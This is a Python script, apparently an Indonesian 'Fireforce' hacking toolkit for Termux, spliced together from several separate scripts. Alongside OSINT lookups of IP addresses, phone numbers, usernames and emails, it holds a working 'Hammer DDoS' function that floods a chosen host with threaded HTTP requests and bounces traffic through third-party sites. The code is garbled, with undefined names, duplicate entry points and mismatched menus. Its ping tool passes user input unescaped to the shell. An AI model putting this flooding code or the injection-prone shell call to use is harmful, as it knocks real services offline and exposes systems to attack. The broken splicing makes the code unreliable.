#!/usr/bin/env python3
import os
import socket
import requests
import time
import sys
import argparse
import traceback
import threading
import shutil
from time import sleep
from os import path, kill, mkdir, getenv, environ, remove, devnull
from json import loads, decoder
from packaging import version
import importlib
from csv import writer
import subprocess as subp
from ipaddress import ip_address
from signal import SIGTERM
import logging
import random
import threading
from colorama import Fore, Style, init
import urllib.request
from optparse import OptionParser
from queue import Queue
import getpass
import platfrom
import datetime

def get_local_version():
    ...

def get_remote_version():
    ...

def update_tools():
    ...

def check_for_update():
    ...

# Jalankan auto update saat tools.py dibuka
check_for_update()
from Fireforce import run_Fireforce

USER_FILE = "users.txt"

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def loading(text="Loading"):
    for i in range(3):
        print(f"{text}{'.' * (i+1)}", end="\r")
        time.sleep(0.5)
    print(" " * 20, end="\r")  # Clear line

def install_animation(module_name):
    animation_chars = ['|', '/', '-', '\\']
    print(f"\n📦 Installing module '{module_name}'...")
    i = 0
    # Mulai proses install dengan subprocess (non-blocking tidak mudah, jadi kita jalankan blocking dan kasih animasi sederhana sebelum dan sesudah)
    proc = subprocess.Popen([sys.executable, "-m", "pip", "install", module_name],
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            text=True)

    while proc.poll() is None:  # Selama proses masih berjalan
        char = animation_chars[i % len(animation_chars)]
        sys.stdout.write(f"\r[{char}] Installing... Please wait.")
        sys.stdout.flush()
        time.sleep(0.2)
        i += 1

    # Setelah proses selesai
    stdout, stderr = proc.communicate()
    if proc.returncode == 0:
        sys.stdout.write("\r[✔] Installation complete!            \n")
    else:
        sys.stdout.write("\r[✖] Installation failed!              \n")
        print(stderr)

def install_module():
    print("\n📦 Menginstall module...")
    loading("Sedang install")
    modules = ["requests", "colorama", "faker"]
    for mod in modules:
        install_animation(mod)
    print("✅ Semua module berhasil diinstall!")

def masuk_tools_prem():
    print("\n🔐 Masuk ke Tools Premium...")
    loading("Mengecek akses")
    run_tools_prem()

def load_users():
    if not os.path.exists(USER_FILE):
        return set()
    with open(USER_FILE, "r") as f:
        return set(line.strip() for line in f if line.strip())

def save_user(user_id):
    with open(USER_FILE, "a") as f:
        f.write(user_id + "\n")

def get_termux_id():
    try:
        result = subprocess.run(["termux-uuid"], capture_output=True, text=True, timeout=3)
        if result.returncode == 0:
            user_id = result.stdout.strip()
            if user_id:
                return user_id
    except Exception:
        pass

    user_id = input("Masukkan ID Termux kamu (UUID manual): ").strip()
    return user_id

def register_user(user_id, users):
    print(f"ID '{user_id}' belum terdaftar.")
    jawab = input("Apakah kamu ingin daftar dulu? (y/n): ").strip().lower()
    if jawab == "y":
        save_user(user_id)
        print("✅ Registrasi berhasil! Kamu sekarang terdaftar.")
        users.add(user_id)
    else:
        print("❌ Kamu harus daftar dulu untuk menggunakan tools.")
        sys.exit()

def cek_akses_user():
    users = load_users()
    user_id = get_termux_id()
    if user_id not in users:
        register_user(user_id, users)
    else:
        print(f"👋 Selamat datang, user dengan ID '{user_id}' sudah terdaftar!")
    time.sleep(1)

def menu_awal():
    while True:
        clear()
        print("""
╔════════════════════════════════╗
║     🔰 TOOLS KEREN LAUNCHER     ║
╚════════════════════════════════╝
[1] ✅ Install Module
[2] 🔐 Masuk ke Tools Prem
[0] ❌ Keluar
""")
        pilihan = input(">> Pilih menu: ")

        if pilihan == "1":
            install_module()
        elif pilihan == "2":
            masuk_tools_prem()
        elif pilihan == "0":
            print("👋 Keluar...")
            sys.exit()
        else:
            print("❌ Pilihan tidak valid.")
        input("\nTekan ENTER untuk kembali...")

if __name__ == "__main__":
    clear()
    cek_akses_user()
    menu_awal()
    

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def banner_login():
    print(r"""
╔════════════════════════════════════════════╗
║        🔐 WELCOME TO SECURE LOGIN          ║
╠════════════════════════════════════════════╣
║        Masukkan Username dan Password      ║
╚════════════════════════════════════════════╝
""")

def login():
    USERNAME = "admin"      # Ganti sesuai keinginan
    PASSWORD = "12345"      # Ganti sesuai keinginan

    while True:
        clear()
        banner_login()
        username = input("👤 Username : ").strip()
        password = getpass("🔑 Password : ").strip()

        if username == USERNAME and password == PASSWORD:
            print("\n✅ Login berhasil! Mengakses tools...")
            time.sleep(1.5)
            break
        else:
            print("\n❌ Username atau password salah!")
            time.sleep(1.5)

# Contoh pemakaian
if __name__ == "__main__":
    login()
    clear()
    cek_akses_user()
    menu_awal
    # lanjut ke tools kamu...

# Warna ANSI singkat
S= "\033[0m"       # Reset
B = "\033[1m"       # Bold

C = "\033[96m"      # Cyan terang
G = "\033[92m"      # Green terang
Y = "\033[93m"      # Yellow terang
M = "\033[95m"      # Magenta terang

W_BG = "\033[107m"  # Background putih
B_FG = "\033[30m"   # Foreground hitam
R = '\033[91m'
W = '\033[0m'

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

import os
from colorama import init, Fore, Style

init()

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')  # Membersihkan layar
    print(Fore.RED + Style.BRIGHT + r""" ███████╗██╗██████╗ ███████╗███████╗ ██████╗ ██████╗ ██████╗███████╗ 
 ██╔════╝██║██╔══██╗██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝ 
 █████╗ ██║██████╔╝█████╗ █████╗ ██║ ██║██████╔╝██║ █████╗ 
 ██╔══╝ ██║██╔══██╗██╔══╝ ██╔══╝ ██║ ██║██╔══██╗██║ ██╔══╝ 
 ██║ ██║██║ ██║███████╗██║ ╚██████╔╝██║ ██║╚██████╗███████╗ 
 ╚═╝ ╚═╝╚═╝ ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝ ╚═╝ ╚═════╝╚══════╝ 
""")
    print(Fore.YELLOW + Style.BRIGHT + " ⚡ Fireforce - Cyber Tools | Coded by BrayyXplosit")
    print(Fore.CYAN + " 🔹 Version : 1.0")
    print(Fore.CYAN + " 🔻 Stay in the shadows.")
    print(Style.RESET_ALL)

if __name__ == "__main__":
    banner()

def menu():
    print(f"{C}{B}╔══════════════════════════════════════════════╗{S}")
    print(f"{C}{B}║               🚀  TOOLS MENU  🚀             ║{A}")
    print(f"{C}{B}╠══════════════════════════════════════════════╣{S}")
    print(f"{G}{B}║  {W_BG}{B_FG} 1 {R}{G}{B}  ║  Lacak IP dari Domain          🌐          ║{S}")
    print(f"{G}{B}║  {W_BG}{B_FG} 2 {R}{G}{B}  ║  Ghost Tracker (Ping Device)   👻          ║{S}")
    print(f"{G}{B}║  {W_BG}{B_FG} 3 {R}{G}{B}  ║  Email Tracker                 📧          ║{S}")
    print(f"{G}{B}║  {W_BG}{B_FG} 4 {R}{G}{B}  ║  Ping Host                    📡          ║{S}")
    print(f"{G}{B}║  {W_BG}{B_FG} 5 {R}{G}{B}  ║  Lokasi IP Publik Saya        🌍          ║{S}")
    print(f"{G}{B}║  {W_BG}{B_FG} 6 {R}{G}{B}  ║  Hammer                      ⚡️          ║{S}")
    print(f"{Y}{B}║  {W_BG}{B_FG} 0 {R}{Y}{B}  ║  Keluar                       ❌          ║{S}")
    print(f"{C}{B}╚══════════════════════════════════════════════╝{S}\n")
    
# ================== FITUR ======================

def ip_lookup(domain):
    try:
        print(f"\n{Y}[~]{W} Mendapatkan IP dari domain {domain}...")
        ip = socket.gethostbyname(domain)
        print(f"{G}[✓]{W} IP dari {domain} adalah: {C}{ip}{W}")

        print(f"{Y}[~]{W} Mengambil info geolokasi IP...")
        response = requests.get(f"http://ip-api.com/json/{ip}").json()

        if response['status'] == 'success':
            print(f"""
{G}[✓]{W} Informasi IP:
  IP        : {response['query']}
  ISP       : {response['isp']}
  Negara    : {response['country']}
  Region    : {response['regionName']}
  Kota      : {response['city']}
  Zona Waktu: {response['timezone']}
  Koordinat : {response['lat']}, {response['lon']}
""")
        else:
            print(f"{R}[x]{W} Gagal mendapatkan info geolokasi.")
    except socket.gaierror:
        print(f"{R}[x]{W} Domain tidak ditemukan!")
    except Exception as e:
        print(f"{R}[x]{W} Terjadi kesalahan: {e}")
# IMPORT MODULE

import json
import requests
import time
import os
import phonenumbers
from phonenumbers import carrier, geocoder, timezone
from sys import stderr

Bl = '\033[30m'  # VARIABLE BUAT WARNA CUYY
Re = '\033[1;31m'
Gr = '\033[1;32m'
Ye = '\033[1;33m'
Blu = '\033[1;34m'
Mage = '\033[1;35m'
Cy = '\033[1;36m'
Wh = '\033[1;37m'


# utilities

# decorator for attaching run_banner to a function
def is_option(func):
    def wrapper(*args, **kwargs):
        run_banner()
        func(*args, **kwargs)


    return wrapper


# FUNCTIONS FOR MENU
@is_option
def IP_Track():
    ip = input(f"{Wh}\n Enter IP target : {Gr}")  # INPUT IP ADDRESS
    print()
    print(f' {Wh}============= {Gr}SHOW INFORMATION IP ADDRESS {Wh}=============')
    req_api = requests.get(f"http://ipwho.is/{ip}")  # API IPWHOIS.IS
    ip_data = json.loads(req_api.text)
    time.sleep(2)
    print(f"{Wh}\n IP target       :{Gr}", ip)
    print(f"{Wh} Type IP         :{Gr}", ip_data["type"])
    print(f"{Wh} Country         :{Gr}", ip_data["country"])
    print(f"{Wh} Country Code    :{Gr}", ip_data["country_code"])
    print(f"{Wh} City            :{Gr}", ip_data["city"])
    print(f"{Wh} Continent       :{Gr}", ip_data["continent"])
    print(f"{Wh} Continent Code  :{Gr}", ip_data["continent_code"])
    print(f"{Wh} Region          :{Gr}", ip_data["region"])
    print(f"{Wh} Region Code     :{Gr}", ip_data["region_code"])
    print(f"{Wh} Latitude        :{Gr}", ip_data["latitude"])
    print(f"{Wh} Longitude       :{Gr}", ip_data["longitude"])
    lat = int(ip_data['latitude'])
    lon = int(ip_data['longitude'])
    print(f"{Wh} Maps            :{Gr}", f"https://www.google.com/maps/@{lat},{lon},8z")
    print(f"{Wh} EU              :{Gr}", ip_data["is_eu"])
    print(f"{Wh} Postal          :{Gr}", ip_data["postal"])
    print(f"{Wh} Calling Code    :{Gr}", ip_data["calling_code"])
    print(f"{Wh} Capital         :{Gr}", ip_data["capital"])
    print(f"{Wh} Borders         :{Gr}", ip_data["borders"])
    print(f"{Wh} Country Flag    :{Gr}", ip_data["flag"]["emoji"])
    print(f"{Wh} ASN             :{Gr}", ip_data["connection"]["asn"])
    print(f"{Wh} ORG             :{Gr}", ip_data["connection"]["org"])
    print(f"{Wh} ISP             :{Gr}", ip_data["connection"]["isp"])
    print(f"{Wh} Domain          :{Gr}", ip_data["connection"]["domain"])
    print(f"{Wh} ID              :{Gr}", ip_data["timezone"]["id"])
    print(f"{Wh} ABBR            :{Gr}", ip_data["timezone"]["abbr"])
    print(f"{Wh} DST             :{Gr}", ip_data["timezone"]["is_dst"])
    print(f"{Wh} Offset          :{Gr}", ip_data["timezone"]["offset"])
    print(f"{Wh} UTC             :{Gr}", ip_data["timezone"]["utc"])
    print(f"{Wh} Current Time    :{Gr}", ip_data["timezone"]["current_time"])


@is_option
def phoneGW():
    User_phone = input(
        f"\n {Wh}Enter phone number target {Gr}Ex [+6281xxxxxxxxx] {Wh}: {Gr}")  # INPUT NUMBER PHONE
    default_region = "ID"  # DEFAULT NEGARA INDONESIA

    parsed_number = phonenumbers.parse(User_phone, default_region)  # VARIABLE PHONENUMBERS
    region_code = phonenumbers.region_code_for_number(parsed_number)
    jenis_provider = carrier.name_for_number(parsed_number, "en")
    location = geocoder.description_for_number(parsed_number, "id")
    is_valid_number = phonenumbers.is_valid_number(parsed_number)
    is_possible_number = phonenumbers.is_possible_number(parsed_number)
    formatted_number = phonenumbers.format_number(parsed_number, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
    formatted_number_for_mobile = phonenumbers.format_number_for_mobile_dialing(parsed_number, default_region,
                                                                                with_formatting=True)
    number_type = phonenumbers.number_type(parsed_number)
    timezone1 = timezone.time_zones_for_number(parsed_number)
    timezoneF = ', '.join(timezone1)

    print(f"\n {Wh}========== {Gr}SHOW INFORMATION PHONE NUMBERS {Wh}==========")
    print(f"\n {Wh}Location             :{Gr} {location}")
    print(f" {Wh}Region Code          :{Gr} {region_code}")
    print(f" {Wh}Timezone             :{Gr} {timezoneF}")
    print(f" {Wh}Operator             :{Gr} {jenis_provider}")
    print(f" {Wh}Valid number         :{Gr} {is_valid_number}")
    print(f" {Wh}Possible number      :{Gr} {is_possible_number}")
    print(f" {Wh}International format :{Gr} {formatted_number}")
    print(f" {Wh}Mobile format        :{Gr} {formatted_number_for_mobile}")
    print(f" {Wh}Original number      :{Gr} {parsed_number.national_number}")
    print(
        f" {Wh}E.164 format         :{Gr} {phonenumbers.format_number(parsed_number, phonenumbers.PhoneNumberFormat.E164)}")
    print(f" {Wh}Country code         :{Gr} {parsed_number.country_code}")
    print(f" {Wh}Local number         :{Gr} {parsed_number.national_number}")
    if number_type == phonenumbers.PhoneNumberType.MOBILE:
        print(f" {Wh}Type                 :{Gr} This is a mobile number")
    elif number_type == phonenumbers.PhoneNumberType.FIXED_LINE:
        print(f" {Wh}Type                 :{Gr} This is a fixed-line number")
    else:
        print(f" {Wh}Type                 :{Gr} This is another type of number")


@is_option
def TrackLu():
    try:
        username = input(f"\n {Wh}Enter Username : {Gr}")
        results = {}
        social_media = [
            {"url": "https://www.facebook.com/{}", "name": "Facebook"},
            {"url": "https://www.twitter.com/{}", "name": "Twitter"},
            {"url": "https://www.instagram.com/{}", "name": "Instagram"},
            {"url": "https://www.linkedin.com/in/{}", "name": "LinkedIn"},
            {"url": "https://www.github.com/{}", "name": "GitHub"},
            {"url": "https://www.pinterest.com/{}", "name": "Pinterest"},
            {"url": "https://www.tumblr.com/{}", "name": "Tumblr"},
            {"url": "https://www.youtube.com/{}", "name": "Youtube"},
            {"url": "https://soundcloud.com/{}", "name": "SoundCloud"},
            {"url": "https://www.snapchat.com/add/{}", "name": "Snapchat"},
            {"url": "https://www.tiktok.com/@{}", "name": "TikTok"},
            {"url": "https://www.behance.net/{}", "name": "Behance"},
            {"url": "https://www.medium.com/@{}", "name": "Medium"},
            {"url": "https://www.quora.com/profile/{}", "name": "Quora"},
            {"url": "https://www.flickr.com/people/{}", "name": "Flickr"},
            {"url": "https://www.periscope.tv/{}", "name": "Periscope"},
            {"url": "https://www.twitch.tv/{}", "name": "Twitch"},
            {"url": "https://www.dribbble.com/{}", "name": "Dribbble"},
            {"url": "https://www.stumbleupon.com/stumbler/{}", "name": "StumbleUpon"},
            {"url": "https://www.ello.co/{}", "name": "Ello"},
            {"url": "https://www.producthunt.com/@{}", "name": "Product Hunt"},
            {"url": "https://www.snapchat.com/add/{}", "name": "Snapchat"},
            {"url": "https://www.telegram.me/{}", "name": "Telegram"},
            {"url": "https://www.weheartit.com/{}", "name": "We Heart It"}
        ]
        for site in social_media:
            url = site['url'].format(username)
            response = requests.get(url)
            if response.status_code == 200:
                results[site['name']] = url
            else:
                results[site['name']] = (f"{Ye}Username not found {Ye}!")
    except Exception as e:
        print(f"{Re}Error : {e}")
        return

    print(f"\n {Wh}========== {Gr}SHOW INFORMATION USERNAME {Wh}==========")
    print()
    for site, url in results.items():
        print(f" {Wh}[ {Gr}+ {Wh}] {site} : {Gr}{url}")


@is_option
def showIP():
    respone = requests.get('https://api.ipify.org/')
    Show_IP = respone.text

    print(f"\n {Wh}========== {Gr}SHOW INFORMATION YOUR IP {Wh}==========")
    print(f"\n {Wh}[{Gr} + {Wh}] Your IP Adrress : {Gr}{Show_IP}")
    print(f"\n {Wh}==============================================")


# OPTIONS
options = [
    {
        'num': 1,
        'text': 'IP Tracker',
        'func': IP_Track
    },
    {
        'num': 2,
        'text': 'Show Your IP',
        'func': showIP

    },
    {
        'num': 3,
        'text': 'Phone Number Tracker',
        'func': phoneGW
    },
    {
        'num': 4,
        'text': 'Username Tracker',
        'func': TrackLu
    },
    {
        'num': 0,
        'text': 'Exit',
        'func': exit
    }
]


def clear():
    # for windows
    if os.name == 'nt':
        _ = os.system('cls')
    # for mac and linux
    else:
        _ = os.system('clear')


def call_option(opt):
    if not is_in_options(opt):
        raise ValueError('Option not found')
    for option in options:
        if option['num'] == opt:
            if 'func' in option:
                option['func']()
            else:
                print('No function detected')


def execute_option(opt):
    try:
        call_option(opt)
        input(f'\n{Wh}[ {Gr}+ {Wh}] {Gr}Press enter to continue')
        main()
    except ValueError as e:
        print(e)
        time.sleep(2)
        execute_option(opt)
    except KeyboardInterrupt:
        print(f'\n{Wh}[ {Re}! {Wh}] {Re}Exit')
        time.sleep(2)
        exit()


def option_text():
    text = ''
    for opt in options:
        text += f'{Wh}[ {opt["num"]} ] {Gr}{opt["text"]}\n'
    return text


def is_in_options(num):
    for opt in options:
        if opt['num'] == num:
            return True
    return False


import os
from colorama import init, Fore, Style
from sys import stderr

init()

# Definisikan variabel warna
Wh = Fore.WHITE

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def option_text():
    # Definisikan teks opsi di sini
    return "Teks opsi"

def option():
    clear()
    stderr.writelines(f"""
 ________ __ ______ __ 
 / ____/ /_ ____ _____/ /_ /_ __/________ ______/ /__ 
 / / __/ __ \/ __ \/ ___/ __/_____/ / / ___/ __ `/ ___/ //_/ / /_/ / / / / /_/ (__ ) /_/_____/ / / / / /_/ / /__/ ,< 
 \____/_/ /_/\____/____/\__/ /_/ /_/ \__,_/\___/_/|_| 
 {Wh}[ + ] C O D E B Y H U N X [ + ] 
    """)
    stderr.writelines(f"\n\n\n{option_text()}")

if __name__ == "__main__":
    option()


def run_banner():
    clear()
    time.sleep(1)
    stderr.writelines(f"""{Wh}
         .-.
       .'   `.          {Wh}--------------------------------
       :g g   :         {Wh}| {Gr}GHOST - TRACKER - IP ADDRESS {Wh}|
       : o    `.        {Wh}|       {Gr}@CODE BY HUNXBYTS      {Wh}|
      :         ``.     {Wh}--------------------------------
     :             `.
    :  :         .   `.
    :   :          ` . `.
     `.. :            `. ``;
        `:;             `:'
           :              `.
            `.              `.     .
              `'`'`'`---..,___`;.-'
        """)
    time.sleep(0.5)


def main():
    clear()
    option()
    time.sleep(1)
    try:
        opt = int(input(f"{Wh}\n [ + ] {Gr}Select Option : {Wh}"))
        execute_option(opt)
    except ValueError:
        print(f'\n{Wh}[ {Re}! {Wh}] {Re}Please input number')
        time.sleep(2)
        main()


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f'\n{Wh}[ {Re}! {Wh}] {Re}Exit')
        time.sleep(2)
        exit()

def email_tracker():
    email = input(f"{Y}Masukkan alamat email: {W}")
    print(f"{C}Mengumpulkan data dari EmailRep...{W}")
    try:
        res = requests.get(f"https://emailrep.io/{email}", headers={"User-Agent": "Python OSINT"})
        if res.status_code == 200:
            data = res.json()
            print(f"""
{G}Reputasi   : {data.get('reputation')}
Terdaftar   : {data.get('details', {}).get('suspicious', 'Unknown')}
Domain      : {data.get('domain', 'N/A')}
Breached    : {data.get('details', {}).get('credentials_leaked', 'Unknown')}
Social Media: {data.get('details', {}).get('profiles', [])}
            """)
        else:
            print(f"{R}Email tidak ditemukan atau limit API tercapai.{W}")
    except Exception as e:
        print(f"{R}Gagal melacak email: {e}{W}")
def ping_host():
    target = input(f"{Y}Masukkan host/IP yang ingin di-ping: {W}")
    print(f"{C}Mengirim ping ke {target}...{W}")
    param = "-n" if platform.system().lower() == "windows" else "-c"
    os.system(f"ping {param} 4 {target}")

ping_host()

if __name__ == "__main__":
    ping_host()
    
    try:
        result = os.popen(f"ping {param} 4 {target}").read()
        print(f"{G}Hasil Ping:{W}\n{result}")

        # Simpan log
        log_data = f"[Ping Host]\nTarget : {target}\nHasil Ping:\n{result}"

    except Exception as e:
        print(f"{R}Gagal ping host: {e}{W}")

    
def my_ip_location():
    print(f"{C}Mendeteksi IP publik...{W}")
    try:
        ip_data = requests.get("https://api.ipify.org?format=json").json()
        ip = ip_data["ip"]
        print(f"{G}[✓]{W} IP Publik: {C}{ip}{W}")

        data = requests.get(f"http://ip-api.com/json/{ip}").json()
        if data['status'] == 'success':
            print(f"""
{G}Negara    : {data['country']}
Kota       : {data['city']}
ISP        : {data['isp']}
Koordinat  : {data['lat']}, {data['lon']}
Timezone   : {data['timezone']}
IP         : {data['query']}
""")
        else:
            print(f"{R}Gagal mendapatkan informasi lokasi.{W}")
    except Exception as e:
        print(f"{R}Gagal: {e}{W}")
      
import threading
import socket
import random
import time
import urllib.request
from queue import Queue

def hammer_ddos(host: str, port: int = 80, turbo: int = 135, headers_data: str = None):
    useragent = ["Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
                 "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0",
                 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
                 "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
                 "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7",
                 "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
                 "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1"]
    bots = ["http://validator.w3.org/check?uri=", "http://www.facebook.com/sharer/sharer.php?u="]

    if headers_data is None:
        headers_data = "Connection: Keep-Alive\nCache-Control: no-cache\n"

    q = Queue()
    w = Queue()

    def bot_hammering(url):
        try:
            while True:
                req = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(useragent)}))
                print("\033[94mbot is hammering...\033[0m")
                time.sleep(.1)
        except:
            time.sleep(.1)

    def down_it(item):
        try:
            while True:
                packet = str("GET / HTTP/1.1\nHost: " + host + "\n\n User-Agent: " + random.choice(useragent) + "\n" + headers_data).encode('utf-8')
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host, int(port)))
                if s.sendto(packet, (host, int(port))):
                    s.shutdown(1)
                    print("\033[92m", time.ctime(time.time()), "\033[0m \033[94m <--packet terkirim! hammering--> \033[0m")
                else:
                    s.shutdown(1)
                    print("\033[91mshut<->down\033[0m")
                time.sleep(.1)
        except socket.error:
            print("\033[91mno koneksi! server sedang down\033[0m")
            time.sleep(.1)

    def dos():
        while True:
            item = q.get()
            down_it(item)
            q.task_done()

    def dos2():
        while True:
            item = w.get()
            bot_hammering(random.choice(bots) + "http://" + host)
            w.task_done()

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, int(port)))
        s.settimeout(1)
    except socket.error:
        print("\033[91mcek server ip dan port\033[0m")
        return

    print(f"\033[92m{host} port: {port} turbo: {turbo}\033[0m")
    print("\033[94mMohon tunggu...\033[0m")

    for i in range(turbo):
        t = threading.Thread(target=dos)
        t.daemon = True
        t.start()
        t2 = threading.Thread(target=dos2)
        t2.daemon = True
        t2.start()

    item = 0
    while True:
        if item > 1800:
            item = 0
            time.sleep(.1)
        item += 1
        q.put(item)
        w.put(item)
    q.join()
    w.join()

def menu():
    while True:
        print("\n=== Tools Python ===")
        print("1. Hammer DDos Attack")
        print("0. Keluar")
        pilihan = input("Pilih menu: ")
        if pilihan == "7":
            host = input("Masukkan target IP/host: ").strip()
            port_input = input("Masukkan port (default 80): ").strip()
            port = int(port_input) if port_input.isdigit() else 80
            turbo_input = input("Masukkan turbo (default 135): ").strip()
            turbo = int(turbo_input) if turbo_input.isdigit() else 135
            print("\nMulai hammer DDos... (Ctrl+C untuk berhenti)\n")
            try:
                hammer_ddos(host, port, turbo)
            except KeyboardInterrupt:
                print("\n[Dihentikan oleh user]")
        elif pilihan == "0":
            print("Keluar dari tools.")
            break
        else:
            print("Pilihan tidak valid, coba lagi.")

if __name__ == "__main__":
    menu()      
# ================== MAIN ======================

def main():
    while True:
        banner()
        menu()
        choice = input(f"{B}Pilih opsi > {W}")
        if choice == "1":
            ip_lookup()
        elif choice == "2":
            IP_Track()
        elif choice == "3":
            email_tracker()
        elif choice == "4":
        	    ping_host()
        elif choice == "5":
               my_ip_location()
        elif choice == "6":
               http_load_test()
        elif choice == "7":
        	hammer_ddos()
        elif choice == "0":
            print(f"{R}Keluar...{W}")
            break
        else:
            print(f"{R}Opsi tidak valid!{W}")
        input(f"{Y}Tekan Enter untuk kembali ke menu...{W}")

if __name__ == "__main__":
    main()
    